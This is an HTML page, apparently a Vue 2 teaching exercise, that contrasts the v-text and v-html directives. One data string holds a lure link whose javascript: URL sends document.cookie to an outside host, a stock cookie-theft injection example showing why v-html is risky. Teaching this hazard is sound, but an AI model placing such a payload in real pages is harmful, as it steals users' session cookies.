<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="../JS/vue.js"></script>
  <title>Document</title>
</head>
<body>
  <div id="root">
    <h2>{{name}}</h2>
    <h2 v-text="str"></h2>
    <h2 v-html="str"></h2>
    <h2 v-html="str2"></h2>
  </div>
</body>
<script>
  Vue.config.productionTip = false
  new Vue({
    el:'#root',
    data:{
      name:'atguigu',
      str:'<h3>你好</h3>',
      str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>想要资源的快来</a>'
    }
  })
</script>
</html>
